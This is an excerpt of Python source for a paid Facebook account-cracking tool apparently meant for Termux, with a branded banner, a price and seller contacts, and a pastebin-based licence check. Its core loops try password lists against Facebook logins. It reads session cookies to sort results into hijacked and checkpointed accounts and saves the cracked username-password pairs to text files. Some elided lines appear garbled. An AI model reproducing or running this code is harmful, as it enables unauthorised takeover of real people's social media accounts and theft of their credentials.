	...
	def __mbasic__(self, user, _sempak_):
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				print('\r\033[1;37m[\033[1;32mSHANI-OK\033[1;37m]\033[1;32m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
				open('ok.txt','a').write('%s\n' % wrt)
				break
			elif 'checkpoint' in ses.cookies.get_dict():
				print('\r\033[1;31m[\033[1;30mSHANI-CP\033[1;31m]\033[1;30m %s | %s      ' % (user,pw))
				wrt = '%s - %s' % (user,pw)
				ok.append(wrt)
		...
		for pw in _sempak_:
			...
			if 'c_user' in ses.cookies.get_dict():
				...
				try:
					...
					month = bulan_ttl[month].print('\r\033[1;91m[SHANI-CP] %s | %s • %s %s %s%s      ' % (user,pw,day,month,year,tahun(user)))
					wrt = '%s - %s - %s %s %s%s' % (user,pw,day,month,year,tahun(user))
					cp.append(wrt)
					open('SHANI_Cp.txt','a').write('%s\n' % wrt)
					break
				except (KeyError, IOError):
					month = ''
					day   = ''
					...
					pass
				print('\r\033[1;91m[SHANI-CP] %s | %s%s      ' % (user,pw,tahun(user)))
...
def publiccrack():
    ...
    os.system('clear')
    print(banner)
    os.system('rm -rf .shani1.txt')
    os.system('rm -rf .shani2.txt')
...
def create_file():
    ...
    for links in range(ask_link):
        completed +=1
        li = ('1')
        os.system('cat .shani1.txt | grep '+li+' >> .shani2.txt')
    ...
    os.system('clear')
    lines = open('.shani2.txt', 'r').readlines()
    print(banner)
    ...
    version()
if not os.path.exists(".shaniwork.txt"):
	open(".shaniwork.txt", 'w').close()
class load:
    def __init__(self):
        _ = ''
        __ = int('30')
...
banner = """
    ...
    \033[1;94m##     ## ##     ## ######## ######## ##     ## ##     ## 
       \033[1;32m┌────────────────────────────────────────────────┐
       \033[1;32m│\033[1;31m➣\033[1;37m AUTHOR  \033[1;31m:\033[1;32m  SHANI-BRAND │\033[1;37m• \033[1;36mTHIS TOOL IS PAID \033[1;37m•\033[1;32m │
       \033[1;32m│\033[1;31m➣\033[1;37m FACEBOOK\033[1;31m:\033[1;32m   SHAHNOOR   │\033[1;37m• \033[1;36mPER MONTH PACKAGE \033[1;37m• \033[1;32m│
       \033[1;32m│\033[1;31m➣\033[1;37m WHATSAPP\033[1;31m:\033[1;32m +923402798893│\033[1;32m──────────────────────\033[1;32m│
       \033[1;32m│\033[1;31m➣\033[1;37m  GITHUB \033[1;31m:\033[1;32m   TECH-SHANI │\033[1;37m     \033[1;36mPRICE \033[1;31m= \033[1;36m300RS \033[1;37m   \033[1;32m│
       \033[1;32m└────────────────────────────────────────────────┘
       \033[1;32m│     \033[1;37m• THIS TOOL CREATED BY CYBER SINDHI   \033[1;37m•    \033[1;32m│
       \033[1;32m└────────────────────────────────────────────────┘
"""
ct = datetime.now()
n = ct.month
...
def main_apv():
    ...
    os.system('xdg-open https://www.Facebook.com/Shahnoor.780')
    try:
        key1=open('/data/data/com.termux/files/usr/bin/.shahnoor-cov', 'r').read()
    except IOError:
        os.system("clear")
        logo()
        print ("[*]--------------------------------------------------------------")
        ...
        print ("[*]--------------------------------------------------------------")  
        kok=open('/data/data/com.termux/files/usr/bin/.shahnoor-cov', 'w')
        kok.close()
        print ("")
        print ("")
        ...
        print ("[*]--------------------------------------------------------------")
        time.sleep(6)
        os.system("xdg-open https://wa.me/+923402798893")
    r1=requests.get("https://pastebin.com/raw/GUgkVAWC").text
    if key1 in r1:
        R()
    else:
        os.system("clear")
        os.system('xdg-open https://Facebook.com/Shahnoor.780')
        logo()
        print ("[*]--------------------------------------------------------------")
        print ("  Your Token Is Not Approved Already")
        print ("[*]--------------------------------------------------------------")
